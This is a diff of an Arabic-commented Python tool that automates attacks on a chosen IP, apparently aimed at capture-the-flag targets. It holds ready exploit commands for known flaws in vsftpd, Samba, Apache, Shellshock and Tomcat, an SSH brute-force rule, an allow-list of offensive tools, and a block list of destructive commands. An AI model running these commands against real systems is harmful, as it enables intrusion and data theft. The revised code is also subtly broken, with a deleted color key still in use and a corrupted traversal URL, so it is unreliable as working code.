@@ -4,7 +4,7 @@
 """
 ╔═══════════════════════════════════════════════════════════════╗
 ║                 GHENA ULTIMATE - الإصدار الأسطوري             ║
-║                    (بدون Burp وبدون ذكاء اصطناعي)             ║
+║                    (نسخة خفيفة بدون أخطاء)                    ║
 ╚═══════════════════════════════════════════════════════════════╝
 """
 
@@ -16,13 +16,11 @@ import re
 import time
 import socket
 import threading
-import readline
 from datetime import datetime
 from pathlib import Path
-from collections import defaultdict
-from typing import Dict, List, Optional, Tuple, Any
+from typing import Dict, List, Optional, Tuple
 
-# محاولة استيراد PyQt6 (اختياري، إذا لم يوجد نعمل في وضع CLI)
+# محاولة استيراد PyQt6 (اختياري)
 try:
     from PyQt6.QtWidgets import *
     from PyQt6.QtCore import *
@@ -35,252 +33,63 @@ except ImportError:
 # ========================= الإعدادات =========================
 VERSION = "42.0 ULTIMATE"
 AUTHOR = "ARABIAN OPS"
-GITHUB = "https://github.com/yourusername/GHENA-Ultimate"
 
-# ألوان (تستخدم في CLI و GUI)
+# ألوان للـ CLI
 COLORS = {
     "HEADER": '\033[95m',
     "OKBLUE": '\033[94m',
-    "OKCYAN": '\033[96m',
     "OKGREEN": '\033[92m',
     "WARNING": '\033[93m',
     "FAIL": '\033[91m',
     "ENDC": '\033[0m',
     "BOLD": '\033[1m',
-    "UNDERLINE": '\033[4m'
 }
 
-# الأوامر المسموح بها (لأسباب أمنية)
+# الأوامر المسموح بها
 ALLOWED_COMMANDS = [
     "nmap", "masscan", "gobuster", "dirb", "nikto", "wpscan",
     "sqlmap", "hydra", "john", "hashcat", "msfconsole", "searchsploit",
-    "enum4linux", "smbclient", "netcat", "nc", "wireshark", "tshark",
-    "curl", "wget", "openssl", "ssh", "python3", "perl", "php",
-    "nuclei", "httpx", "ffuf", "wfuzz", "crackmapexec", "impacket",
-    "dnsrecon", "dnsenum", "theHarvester", "sublist3r", "amass",
-    "whatweb", "wafw00f", "xsser", "commix", "ysoserial", "responder"
+    "enum4linux", "smbclient", "netcat", "nc", "curl", "wget",
+    "ssh", "python3", "php", "nuclei", "ffuf", "whatweb"
 ]
 
 # الأوامر المحظورة
 BLOCKED_PATTERNS = [
     "rm -rf /", "mkfs", "dd if=", "> /dev/sda", "format",
-    "diskpart", "fdisk", "mv /* /dev/null", ":(){ :|:& };:", "chmod -R 000"
+    "mv /* /dev/null", ":(){ :|:& };:"
 ]
 
-# ======================= قاعدة بيانات الثغرات العملاقة =======================
+# ======================= قاعدة بيانات الثغرات =======================
 VULNERABILITY_DB = {
-    # -------------------- FTP --------------------
     "vsftpd 2.3.4": {
-        "cve": "CVE-2011-2523",
         "name": "vsFTPd 2.3.4 Backdoor",
-        "type": "backdoor",
         "cvss": 9.8,
         "command": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST {ip}; run'",
-        "description": "باب خلفي في vsFTPd يسمح بتنفيذ أوامر",
-        "ref": "https://www.exploit-db.com/exploits/17491"
+        "description": "باب خلفي في vsFTPd"
     },
-    "proftpd 1.3.5": {
-        "cve": "CVE-2015-3306",
-        "name": "ProFTPD mod_copy RCE",
-        "type": "rce",
-        "cvss": 9.8,
-        "command": "curl -s 'ftp://{ip}:80/' -v -C - -o /tmp/poc && python3 exploit.py {ip}",
-        "description": "ثغرة نسخ الملفات وتنفيذ الأوامر",
-        "ref": "https://www.exploit-db.com/exploits/36742"
-    },
-    # -------------------- Apache --------------------
     "apache 2.4.49": {
-        "cve": "CVE-2021-41773",
         "name": "Apache Path Traversal",
-        "type": "path traversal",
         "cvss": 7.5,
-        "command": "curl -s 'http://{ip}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
-        "description": "ثغرة عبور المسار في Apache",
-        "ref": "https://www.exploit-db.com/exploits/50383"
+        "command": "curl -s 'http://{ip}/cgi-bin/.%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/etc/passwd'",
+        "description": "ثغرة عبور المسار"
     },
-    "apache 2.4.50": {
-        "cve": "CVE-2021-42013",
-        "name": "Apache RCE",
-        "type": "rce",
-        "cvss": 9.8,
-        "command": "curl -s 'http://{ip}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' -d 'echo; id'",
-        "description": "تنفيذ أوامر عن بعد في Apache",
-        "ref": "https://www.exploit-db.com/exploits/50406"
-    },
-    "apache tomcat 8.5.0": {
-        "cve": "CVE-2017-12617",
-        "name": "Tomcat RCE",
-        "type": "rce",
-        "cvss": 8.1,
-        "command": "msfconsole -q -x 'use exploit/multi/http/tomcat_jsp_upload_bypass; set RHOST {ip}; run'",
-        "description": "تنفيذ أوامر في Tomcat عبر رفع JSP",
-        "ref": "https://www.exploit-db.com/exploits/42966"
-    },
-    # -------------------- Samba --------------------
     "samba 3.5.0": {
-        "cve": "CVE-2017-7494",
         "name": "SambaCry",
-        "type": "rce",
         "cvss": 9.8,
         "command": "msfconsole -q -x 'use exploit/linux/samba/is_known_pipename; set RHOST {ip}; run'",
-        "description": "ثغرة SambaCry الشهيرة",
-        "ref": "https://www.exploit-db.com/exploits/42060"
-    },
-    "samba 3.6.0": {
-        "cve": "CVE-2015-0240",
-        "name": "Samba symlink traversal",
-        "type": "path traversal",
-        "cvss": 6.5,
-        "command": "smbclient //{ip}/share -c 'lcd /tmp; cd /; get /etc/passwd'",
-        "description": "اجتياز المسار عبر الروابط الرمزية",
-        "ref": "https://www.exploit-db.com/exploits/36772"
-    },
-    # -------------------- Shellshock --------------------
-    "bash 4.3": {
-        "cve": "CVE-2014-6271",
-        "name": "Shellshock",
-        "type": "rce",
-        "cvss": 10.0,
-        "command": "curl -H 'User-Agent: () { :; }; echo; /bin/bash -c \"id\"' http://{ip}/cgi-bin/test",
-        "description": "ثغرة Shellshock في Bash",
-        "ref": "https://www.exploit-db.com/exploits/34765"
-    },
-    # -------------------- Heartbleed --------------------
-    "openssl 1.0.1": {
-        "cve": "CVE-2014-0160",
-        "name": "Heartbleed",
-        "type": "information disclosure",
-        "cvss": 7.5,
-        "command": "nmap -sV --script ssl-heartbleed {ip} -p 443",
-        "description": "ثغرة Heartbleed في OpenSSL",
-        "ref": "https://www.exploit-db.com/exploits/32745"
-    },
-    # -------------------- WordPress --------------------
-    "wordpress 4.7": {
-        "cve": "CVE-2017-1001000",
-        "name": "WordPress REST API RCE",
-        "type": "rce",
-        "cvss": 9.8,
-        "command": "wp scan {ip} --api",
-        "description": "ثغرة في REST API تسمح بتنفيذ أوامر",
-        "ref": "https://www.exploit-db.com/exploits/41963"
-    },
-    "wordpress 5.8": {
-        "cve": "CVE-2021-24499",
-        "name": "WordPress RCE via plugin",
-        "type": "rce",
-        "cvss": 9.0,
-        "command": "wpscan --url http://{ip} --enumerate vp",
-        "description": "ثغرة في إضافات WordPress",
-        "ref": "https://wpscan.com/vulnerability/..."
-    },
-    # -------------------- Jenkins --------------------
-    "jenkins 2.0": {
-        "cve": "CVE-2018-1000861",
-        "name": "Jenkins RCE",
-        "type": "rce",
-        "cvss": 9.8,
-        "command": "msfconsole -q -x 'use exploit/multi/http/jenkins_metaprogramming; set RHOST {ip}; run'",
-        "description": "تنفيذ أوامر في Jenkins",
-        "ref": "https://www.exploit-db.com/exploits/46572"
-    },
-    # -------------------- SSH --------------------
-    "openssh 7.2p2": {
-        "cve": "CVE-2016-6210",
-        "name": "OpenSSH user enumeration",
-        "type": "enumeration",
-        "cvss": 5.0,
-        "command": "nmap -p 22 --script ssh-brute --script-args userdb=users.txt {ip}",
-        "description": "ثغرة تعداد المستخدمين",
-        "ref": "https://www.exploit-db.com/exploits/40888"
-    },
-    # -------------------- SMTP --------------------
-    "smtp": {
-        "cve": "CVE-2011-1720",
-        "name": "SMTP user enumeration",
-        "type": "enumeration",
-        "cvss": 5.0,
-        "command": "smtp-user-enum -M VRFY -U users.txt -t {ip}",
-        "description": "تعداد المستخدمين عبر SMTP",
-        "ref": "https://www.exploit-db.com/exploits/17310"
-    },
-    # -------------------- RDP --------------------
-    "rdp": {
-        "cve": "CVE-2019-0708",
-        "name": "BlueKeep RCE",
-        "type": "rce",
-        "cvss": 9.8,
-        "command": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOST {ip}; run'",
-        "description": "ثغرة BlueKeep في RDP",
-        "ref": "https://www.exploit-db.com/exploits/47158"
-    },
-    # -------------------- DNS --------------------
-    "dns": {
-        "cve": "CVE-2015-7547",
-        "name": "glibc getaddrinfo RCE",
-        "type": "rce",
-        "cvss": 9.8,
-        "command": "python3 glibc_rop.py {ip}",
-        "description": "ثغرة في glibc تسمح بتنفيذ أوامر",
-        "ref": "https://www.exploit-db.com/exploits/39453"
-    },
-    # -------------------- Java RMI --------------------
-    "java-rmi": {
-        "cve": "CVE-2017-3241",
-        "name": "Java RMI RCE",
-        "type": "rce",
-        "cvss": 9.8,
-        "command": "msfconsole -q -x 'use exploit/multi/misc/java_rmi_server; set RHOST {ip}; run'",
-        "description": "ثغرة في Java RMI",
-        "ref": "https://www.exploit-db.com/exploits/41357"
-    },
-    # -------------------- Zimbra --------------------
-    "zimbra 8.8.15": {
-        "cve": "CVE-2020-12889",
-        "name": "Zimbra RCE",
-        "type": "rce",
-        "cvss": 9.8,
-        "command": "python3 exploit_zimbra.py {ip}",
-        "description": "ثغرة في Zimbra Collaboration",
-        "ref": "https://www.exploit-db.com/exploits/48555"
-    },
-    # -------------------- Laravel --------------------
-    "laravel 5.6": {
-        "cve": "CVE-2018-15133",
-        "name": "Laravel RCE",
-        "type": "rce",
-        "cvss": 9.8,
-        "command": "phpggc Laravel/RCE1 system id -- -d http://{ip}",
-        "description": "ثغرة في Laravel تسمح بتنفيذ أوامر",
-        "ref": "https://www.exploit-db.com/exploits/47138"
-    },
-    # -------------------- MongoDB --------------------
-    "mongodb 3.2": {
-        "cve": "CVE-2015-7882",
-        "name": "MongoDB unauth access",
-        "type": "misconfiguration",
-        "cvss": 7.5,
-        "command": "nmap -p 27017 --script mongodb-info {ip}",
-        "description": "قاعدة بيانات بدون مصادقة",
-        "ref": "https://www.exploit-db.com/exploits/38706"
+        "description": "ثغرة SambaCry"
     }
 }
 
-# ======================= محرك القواعد الخبيرة =======================
+# ======================= محرك القواعد =======================
 class RuleEngine:
-    """محرك القواعد المتقدم - يولد الأوامر بناءً على المعلومات المتاحة"""
-    
     def __init__(self, target_ip: str):
         self.ip = target_ip
-        self.services: Dict[int, str] = {}
-        self.open_ports: List[int] = []
-        self.software_versions: Dict[str, str] = {}
-        self.discovered_paths: List[str] = []
-        self.credentials: List[Tuple[str, str]] = []
-        self.executed_commands: List[str] = []
-        self.successful_exploits: List[str] = []
+        self.open_ports = []
+        self.services = {}
+        self.versions = {}
+        self.executed = []
         
-        # قواعد ثابتة (يمكن تحميلها من ملف YAML لاحقاً)
         self.rules = [
             {
                 "name": "nmap_initial",
@@ -290,452 +99,269 @@ class RuleEngine:
                 "priority": 100
             },
             {
-                "name": "nmap_full",
-                "condition": lambda ctx: len(ctx.open_ports) < 10 and "nmap -sV" in " ".join(ctx.executed_commands),
-                "command": "nmap -sC -sV -p- -T4 {ip}",
-                "reason": "فحص جميع المنافذ للحصول على صورة كاملة",
-                "priority": 90
-            },
-            {
                 "name": "web_scan",
-                "condition": lambda ctx: any(p in [80, 443, 8080, 8443] for p in ctx.open_ports),
+                "condition": lambda ctx: any(p in [80, 443, 8080] for p in ctx.open_ports),
                 "command": "gobuster dir -u http://{ip}:{port} -w /usr/share/wordlists/dirb/common.txt -t 50",
-                "reason": "فحص الدلائل على خادم الويب",
+                "reason": "فحص الدلائل على الويب",
                 "priority": 80,
-                "port_dependent": True
-            },
-            {
-                "name": "web_nikto",
-                "condition": lambda ctx: any(p in [80, 443, 8080, 8443] for p in ctx.open_ports),
-                "command": "nikto -h http://{ip}:{port}",
-                "reason": "فحص الثغرات الأمنية للويب",
-                "priority": 75,
-                "port_dependent": True
-            },
-            {
-                "name": "lfi_test",
-                "condition": lambda ctx: any("php" in ctx.services.get(p, "") for p in ctx.open_ports),
-                "command": "curl -s 'http://{ip}:{port}/?page=../../../../etc/passwd'",
-                "reason": "اختبار ثغرة Local File Inclusion (LFI)",
-                "priority": 70,
                 "port_dependent": True
             },
             {
                 "name": "smb_enum",
                 "condition": lambda ctx: any(p in [139, 445] for p in ctx.open_ports),
                 "command": "enum4linux -a {ip}",
-                "reason": "جمع معلومات من SMB",
+                "reason": "جمع معلومات SMB",
                 "priority": 85
-            },
-            {
-                "name": "ftp_anon",
-                "condition": lambda ctx: 21 in ctx.open_ports,
-                "command": "nmap --script ftp-anon -p 21 {ip}",
-                "reason": "فحص FTP للتأكد من السماح بالدخول المجهول",
-                "priority": 80
-            },
-            {
-                "name": "ssh_bruteforce",
-                "condition": lambda ctx: 22 in ctx.open_ports,
-                "command": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4",
-                "reason": "هجوم قاموس على SSH",
-                "priority": 60
-            },
-            {
-                "name": "searchsploit",
-                "condition": lambda ctx: len(ctx.software_versions) > 0,
-                "command": "searchsploit {service} {version}",
-                "reason": "البحث عن إكسبلويت للخدمة المكتشفة",
-                "priority": 90,
-                "service_dependent": True
-            },
-            {
-                "name": "heartbleed",
-                "condition": lambda ctx: any(p in [443, 8443] and ctx.software_versions.get("openssl", "").startswith("1.0.1") for p in ctx.open_ports),
-                "command": "nmap -sV --script ssl-heartbleed -p {port} {ip}",
-                "reason": "اختبار ثغرة Heartbleed",
-                "priority": 95,
-                "port_dependent": True
             }
         ]
         
-    def update_context(self, services: Dict[int, str], open_ports: List[int], versions: Dict[str, str], discovered_paths: List[str], credentials: List[Tuple], executed: List[str]):
-        self.services = services
+    def update_context(self, open_ports, services, versions, executed):
         self.open_ports = open_ports
-        self.software_versions = versions
-        self.discovered_paths = discovered_paths
-        self.credentials = credentials
-        self.executed_commands = executed
+        self.services = services
+        self.versions = versions
+        self.executed = executed
         
-    def get_next_commands(self) -> List[Dict]:
-        """تقييم القواعد وإرجاع الأوامر المقترحة مرتبة حسب الأولوية"""
+    def get_next_commands(self):
         candidates = []
         for rule in self.rules:
             try:
                 if rule.get("port_dependent"):
                     for port in self.open_ports:
-                        ctx = self  # سياق كامل
-                        # نمرر المنفذ للقاعدة
                         cmd = rule["command"].format(ip=self.ip, port=port)
-                        if not self._is_command_executed(cmd):
-                            candidates.append({
-                                "cmd": cmd,
-                                "reason": rule["reason"].format(port=port),
-                                "priority": rule["priority"],
-                                "rule": rule["name"]
-                            })
-                elif rule.get("service_dependent"):
-                    for service, version in self.software_versions.items():
-                        cmd = rule["command"].format(ip=self.ip, service=service, version=version)
-                        if not self._is_command_executed(cmd):
-                            candidates.append({
-                                "cmd": cmd,
-                                "reason": rule["reason"].format(service=service, version=version),
-                                "priority": rule["priority"],
-                                "rule": rule["name"]
-                            })
+                        candidates.append({
+                            "cmd": cmd,
+                            "reason": rule["reason"],
+                            "priority": rule["priority"]
+                        })
                 else:
                     if rule["condition"](self):
                         cmd = rule["command"].format(ip=self.ip)
-                        if not self._is_command_executed(cmd):
-                            candidates.append({
-                                "cmd": cmd,
-                                "reason": rule["reason"],
-                                "priority": rule["priority"],
-                                "rule": rule["name"]
-                            })
-            except Exception as e:
-                # تجاهل القاعدة إذا سببت خطأ
+                        candidates.append({
+                            "cmd": cmd,
+                            "reason": rule["reason"],
+                            "priority": rule["priority"]
+                        })
+            except:
                 continue
-                
-        # ترتيب حسب الأولوية (الأعلى أولاً)
         candidates.sort(key=lambda x: x["priority"], reverse=True)
         return candidates
-        
-    def _is_command_executed(self, cmd: str) -> bool:
-        """التحقق مما إذا كان الأمر قد نُفذ من قبل (تقريباً)"""
-        # تجاهل المتغيرات مثل {port} - نقارن بداية الأمر فقط
-        base_cmd = cmd.split()[0] if cmd else ""
-        return any(base_cmd in executed for executed in self.executed_commands)
 
-# ======================= العقل المدبر (الرئيسي) =======================
+# ======================= العقل المدبر =======================
 class GhenaCore:
-    """القلب النابض للأداة - يدير كل شيء"""
-    
     def __init__(self, target_ip: str, goal: str = "user_flag"):
         self.ip = target_ip
         self.goal = goal
-        self.rule_engine = RuleEngine(target_ip)
-        self.history: List[Dict] = []
-        self.findings: List[Dict] = []
-        self.open_ports: List[int] = []
-        self.services: Dict[int, str] = {}
-        self.versions: Dict[str, str] = {}
-        self.paths: List[str] = []
-        self.credentials: List[Tuple[str, str]] = []
-        self.executed_commands: List[str] = []
-        self.stop_flag = False
-        self.session_dir = Path(f"sessions/{target_ip}_{int(time.time())}")
-        self.session_dir.mkdir(parents=True, exist_ok=True)
+        self.engine = RuleEngine(target_ip)
+        self.history = []
+        self.findings = []
+        self.open_ports = []
+        self.services = {}
+        self.versions = {}
+        self.executed = []
+        self.stop = False
         
-    def log(self, msg: str, level: str = "info"):
+        # إنشاء مجلد للجلسة
+        self.session_dir = Path(f"GHENA_{target_ip}_{int(time.time())}")
+        self.session_dir.mkdir(exist_ok=True)
+        
+    def log(self, msg, level="info"):
         timestamp = datetime.now().strftime("%H:%M:%S")
         color = COLORS.get(level.upper(), COLORS["OKBLUE"])
         print(f"{color}[{timestamp}] {msg}{COLORS['ENDC']}")
         
-    def is_safe_command(self, cmd: str) -> Tuple[bool, str]:
+    def is_safe(self, cmd):
         cmd_lower = cmd.lower()
         for pattern in BLOCKED_PATTERNS:
             if pattern in cmd_lower:
-                return False, f"أمر محظور: {pattern}"
-        first_word = cmd_lower.split()[0] if cmd_lower else ""
-        if first_word and first_word not in ALLOWED_COMMANDS:
-            if not any(cmd_lower.startswith(allowed) for allowed in ALLOWED_COMMANDS):
-                return False, f"أداة غير مسموح بها: {first_word}"
-        return True, "آمن"
+                return False
+        first = cmd_lower.split()[0] if cmd_lower else ""
+        return first in ALLOWED_COMMANDS
         
-    def execute_command(self, cmd: str, timeout: int = 600) -> str:
-        self.log(f"تنفيذ: {cmd}", "command")
-        safe, reason = self.is_safe_command(cmd)
-        if not safe:
-            self.log(f"تم رفض الأمر: {reason}", "warning")
-            return f"REJECTED: {reason}"
+    def execute(self, cmd, timeout=600):
+        self.log(f"⚡ تنفيذ: {cmd}", "command")
+        
+        if not self.is_safe(cmd):
+            self.log("⚠️ أمر غير آمن - تم الرفض", "warning")
+            return "REJECTED"
             
         try:
-            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
-                                             text=True, timeout=timeout)
-            self.executed_commands.append(cmd)
+            result = subprocess.check_output(
+                cmd, shell=True, stderr=subprocess.STDOUT,
+                text=True, timeout=timeout
+            )
+            self.executed.append(cmd)
             self.history.append({
                 "cmd": cmd,
-                "result": result[:1000],  # حفظ جزء
+                "result": result[:500],
                 "time": datetime.now().isoformat()
             })
-            self.analyze_output(result, cmd)
+            self.analyze(result, cmd)
             return result
-        except subprocess.TimeoutExpired:
-            self.log("تجاوز الوقت المحدد", "error")
-            return "TIMEOUT"
-        except subprocess.CalledProcessError as e:
-            self.log(f"خطأ: {e.output}", "error")
-            return e.output
         except Exception as e:
-            self.log(f"خطأ غير متوقع: {e}", "error")
-            return f"ERROR: {e}"
+            self.log(f"❌ خطأ: {e}", "error")
+            return str(e)
             
-    def analyze_output(self, output: str, cmd: str):
-        """تحليل مخرجات الأوامر واستخراج المعلومات"""
-        # كشف المنافذ الجديدة
+    def analyze(self, output, cmd):
+        # استخراج المنافذ من nmap
         if "nmap" in cmd:
-            self.extract_ports_from_nmap(output)
-            self.extract_versions_from_nmap(output)
+            pattern = r"(\d+)/tcp\s+open\s+(\S+)"
+            for port, service in re.findall(pattern, output):
+                port = int(port)
+                if port not in self.open_ports:
+                    self.open_ports.append(port)
+                    self.services[port] = service
+                    self.log(f"🔓 منفذ جديد: {port} ({service})", "critical")
+                    
+        # البحث عن العلم
+        flag_pattern = r"flag\{[^}]+\}|FLAG\{[^}]+\}"
+        match = re.search(flag_pattern, output)
+        if match:
+            self.findings.append({
+                "severity": "CRITICAL",
+                "title": "🎯 تم العثور على العلم!",
+                "flag": match.group(0),
+                "command": cmd
+            })
+            self.log(f"🎉 العلم: {match.group(0)}", "critical")
+            self.stop = True
             
-        # كشف المسارات من gobuster/dirb
-        if "gobuster" in cmd or "dirb" in cmd:
-            self.extract_paths_from_dirbuster(output)
+        # البحث عن صلاحيات الجذر
+        if re.search(r"# |root:", output):
+            self.findings.append({
+                "severity": "CRITICAL",
+                "title": "🔓 صلاحيات الجذر!",
+                "command": cmd
+            })
+            self.log("🔓 تم الوصول إلى الجذر!", "critical")
+            self.stop = True
             
-        # كشف الثغرات المعروفة
-        self.detect_vulnerabilities(output, cmd)
-        
-        # كشف العلم أو كلمات المرور
-        self.detect_success_indicators(output, cmd)
-        
-    def extract_ports_from_nmap(self, output: str):
-        pattern = r"(\d+)/tcp\s+open\s+(\S+)"
-        matches = re.findall(pattern, output)
-        for port_str, service in matches:
-            port = int(port_str)
-            if port not in self.open_ports:
-                self.open_ports.append(port)
-                self.services[port] = service
-                self.log(f"🔓 منفذ جديد: {port} ({service})", "critical")
-                
-    def extract_versions_from_nmap(self, output: str):
-        # محاولة استخراج الإصدارات من nmap
-        pattern = r"(\d+)/tcp.*?(\S+)\s+(\d+\.\d+\.\d+|\d+\.\d+)"
-        matches = re.findall(pattern, output)
-        for port, service, version in matches:
-            key = service.lower()
-            self.versions[key] = version
-            self.log(f"📌 {service} {version} على المنفذ {port}", "info")
-            
-            # البحث في قاعدة الثغرات
-            vuln_key = f"{service.lower()} {version}"
-            if vuln_key in VULNERABILITY_DB:
-                vuln = VULNERABILITY_DB[vuln_key]
-                self.findings.append({
-                    "type": "vulnerability",
-                    "severity": "CRITICAL" if vuln['cvss'] >= 9 else "HIGH",
-                    "title": vuln['name'],
-                    "description": vuln['description'],
-                    "command": vuln['command'].format(ip=self.ip),
-                    "cve": vuln['cve'],
-                    "ref": vuln.get('ref', '')
-                })
-                self.log(f"🎯 ثغرة معروفة: {vuln['name']}", "critical")
-                
-    def extract_paths_from_dirbuster(self, output: str):
-        # استخراج المسارات من gobuster/dirb
-        pattern = r"(/\S+)\s+\(Status:\s*\d+\)"
-        matches = re.findall(pattern, output)
-        for path in matches:
-            if path not in self.paths:
-                self.paths.append(path)
-                self.log(f"📁 مسار جديد: {path}", "success")
-                
-    def detect_vulnerabilities(self, output: str, cmd: str):
-        # الكشف عن الثغرات بناءً على أنماط محددة
-        vuln_patterns = {
-            "root:|# ": "CRITICAL: يبدو أنك حصلت على صلاحيات الجذر!",
-            "flag\{[^}]+\}": "🎯 العلم موجود!",
-            "mysql_connect": "ربما هناك خطأ في اتصال MySQL",
-            "SQL syntax": "قد يكون هناك ثغرة SQL injection",
-            "Warning: include(": "ربما هناك LFI/RFI",
-            "etc/passwd": "تم تسريب ملف passwd",
-            "private key": "تم العثور على مفتاح خاص"
-        }
-        for pattern, msg in vuln_patterns.items():
-            if re.search(pattern, output, re.IGNORECASE):
-                finding = {
-                    "type": "pattern",
-                    "severity": "CRITICAL" if "🎯" in msg else "HIGH",
-                    "title": msg,
-                    "description": f"تم الكشف عن النمط '{pattern}' في مخرجات الأمر",
-                    "command": cmd
-                }
-                self.findings.append(finding)
-                self.log(msg, "critical")
-                
-    def detect_success_indicators(self, output: str, cmd: str):
-        # البحث عن علامات النجاح بناءً على الهدف
-        if self.goal == "user_flag":
-            match = re.search(r"flag\{[^}]+\}", output)
-            if match:
-                self.findings.append({
-                    "type": "flag",
-                    "severity": "CRITICAL",
-                    "title": "🎯 تم العثور على علم المستخدم!",
-                    "flag": match.group(0),
-                    "command": cmd
-                })
-                self.log(f"🎉 العلم: {match.group(0)}", "critical")
-                self.stop_flag = True
-        elif self.goal == "root_access":
-            if re.search(r"# |root:", output):
-                self.findings.append({
-                    "type": "root",
-                    "severity": "CRITICAL",
-                    "title": "🔓 تم الوصول إلى صلاحيات الجذر!",
-                    "command": cmd
-                })
-                self.log("🔓 تم الوصول إلى الجذر!", "critical")
-                self.stop_flag = True
-                
     def save_state(self):
-        """حفظ الحالة الحالية للجلسة"""
         state = {
             "ip": self.ip,
             "goal": self.goal,
             "open_ports": self.open_ports,
             "services": self.services,
-            "versions": self.versions,
-            "paths": self.paths,
-            "credentials": self.credentials,
-            "history": self.history,
             "findings": self.findings,
-            "timestamp": datetime.now().isoformat()
+            "history": self.history,
+            "time": datetime.now().isoformat()
         }
-        state_file = self.session_dir / "state.json"
-        with open(state_file, "w") as f:
+        with open(self.session_dir / "state.json", "w") as f:
             json.dump(state, f, indent=2)
-        self.log(f"💾 تم حفظ الحالة في {state_file}")
+        self.log("💾 تم حفظ الحالة")
         
-    def generate_report(self) -> str:
-        """توليد تقرير نصي جميل"""
+    def run(self):
+        self.log("🚀 بدء الهجوم...", "header")
+        
+        commands = self.engine.get_next_commands()
+        
+        while commands and not self.stop:
+            for cmd_info in commands:
+                if self.stop:
+                    break
+                    
+                print(f"\n{COLORS['OKCYAN']}📋 {cmd_info['reason']}{COLORS['ENDC']}")
+                print(f"{COLORS['BOLD']}الأمر: {cmd_info['cmd']}{COLORS['ENDC']}")
+                
+                ans = input("تنفيذ؟ [Y/n] ").strip().lower()
+                if ans in ('', 'y', 'yes'):
+                    output = self.execute(cmd_info['cmd'])
+                    print(output[:300] + ("..." if len(output) > 300 else ""))
+                    
+                # تحديث السياق
+                self.engine.update_context(
+                    self.open_ports, self.services,
+                    self.versions, self.executed
+                )
+                self.save_state()
+                
+            commands = self.engine.get_next_commands()
+            if not commands:
+                self.log("✅ انتهت الأوامر", "success")
+                
+        self.generate_report()
+        
+    def generate_report(self):
         report = f"""
 ╔═══════════════════════════════════════════════════════════════╗
 ║                       تقرير الهجوم                           ║
 ╠═══════════════════════════════════════════════════════════════╣
 ║ الهدف: {self.ip}
-║ الهدف النهائي: {self.goal}
-║ وقت البدء: {self.history[0]['time'] if self.history else 'N/A'}
-║ عدد الخطوات: {len(self.history)}
+║ المنافذ: {self.open_ports}
+║ الخدمات: {self.services}
 ╠═══════════════════════════════════════════════════════════════╣
-║ المنافذ المفتوحة: {self.open_ports}
-║ الخدمات المكتشفة: {json.dumps(self.services, indent=2, ensure_ascii=False)}
-╠═══════════════════════════════════════════════════════════════╣
-║ النتائج الهامة:
+║ النتائج:
 """
-        for finding in self.findings:
-            report += f"""
-  🔹 {finding.get('severity', 'INFO')}: {finding.get('title', '')}
-     {finding.get('description', '')}
-     الأمر: {finding.get('command', 'N/A')}
-"""
-        report += "╚═══════════════════════════════════════════════════════════════╝"
-        return report
+        for f in self.findings:
+            report += f"\n  🔹 {f['title']}"
+            
+        report += "\n╚═══════════════════════════════════════════════════════════════╝"
         
-    def run_auto(self):
-        """حلقة الهجوم الرئيسية"""
-        self.log("🚀 بدء الهجوم التلقائي...", "header")
-        
-        # تنفيذ القاعدة الأولى (nmap)
-        cmds = self.rule_engine.get_next_commands()
-        while cmds and not self.stop_flag:
-            for cmd_info in cmds:
-                if self.stop_flag:
-                    break
-                cmd = cmd_info["cmd"]
-                reason = cmd_info["reason"]
-                self.log(f"📋 الاقتراح: {reason}", "info")
-                self.log(f"الأمر: {cmd}", "command")
-                
-                # طلب موافقة المستخدم (في CLI)
-                ans = input("هل تريد تنفيذ هذا الأمر؟ [Y/n] ").strip().lower()
-                if ans in ('', 'y', 'yes'):
-                    output = self.execute_command(cmd)
-                    self.log(output[:500] + ("..." if len(output) > 500 else ""))
-                else:
-                    self.log("تم تخطي الأمر", "warning")
-                
-                # تحديث السياق بعد كل أمر
-                self.rule_engine.update_context(
-                    services=self.services,
-                    open_ports=self.open_ports,
-                    versions=self.versions,
-                    discovered_paths=self.paths,
-                    credentials=self.credentials,
-                    executed=self.executed_commands
-                )
-                
-                # حفظ الحالة بعد كل أمر
-                self.save_state()
-                
-            # جلب الأوامر التالية
-            cmds = self.rule_engine.get_next_commands()
-            if not cmds:
-                self.log("✅ لا توجد أوامر أخرى في القواعد.", "success")
-                break
-                
-        self.log("🏁 انتهى الهجوم.", "header")
-        report = self.generate_report()
         print(report)
-        report_file = self.session_dir / "report.txt"
-        with open(report_file, "w") as f:
+        with open(self.session_dir / "report.txt", "w") as f:
             f.write(report)
-        self.log(f"📄 تم حفظ التقرير في {report_file}")
 
-# ======================= واجهة سطر الأوامر (CLI) =======================
-def main_cli():
-    print(f"{COLORS['HEADER']}{'='*60}{COLORS['ENDC']}")
+# ======================= واجهة CLI =======================
+def main():
+    print(f"{COLORS['HEADER']}{'='*50}{COLORS['ENDC']}")
     print(f"{COLORS['BOLD']}GHENA ULTIMATE v{VERSION}{COLORS['ENDC']}")
-    print(f"{COLORS['OKBLUE']}الأداة الشاملة لاختبار الاختراق (بدون ذكاء اصطناعي){COLORS['ENDC']}")
-    print(f"{COLORS['HEADER']}{'='*60}{COLORS['ENDC']}")
+    print(f"{COLORS['HEADER']}{'='*50}{COLORS['ENDC']}")
     
-    ip = input("أدخل IP الهدف: ").strip()
+    ip = input("IP الهدف: ").strip()
     if not ip:
-        print(f"{COLORS['FAIL']}IP مطلوب!{COLORS['ENDC']}")
+        print(f"{COLORS['FAIL']}❌ IP مطلوب{COLORS['ENDC']}")
         return
         
-    goal = input("اختر الهدف [user_flag/root_access/passwords] (user_flag): ").strip() or "user_flag"
+    goal = input("الهدف [user_flag/root_access] (user_flag): ").strip() or "user_flag"
     
     core = GhenaCore(ip, goal)
     
     try:
-        core.run_auto()
+        core.run()
     except KeyboardInterrupt:
-        print(f"\n{COLORS['WARNING']}تم إيقاف الهجوم بواسطة المستخدم.{COLORS['ENDC']}")
+        print(f"\n{COLORS['WARNING']}⏹️ تم الإيقاف{COLORS['ENDC']}")
         core.save_state()
-        print("تم حفظ الحالة.")
     except Exception as e:
-        print(f"{COLORS['FAIL']}خطأ غير متوقع: {e}{COLORS['ENDC']}")
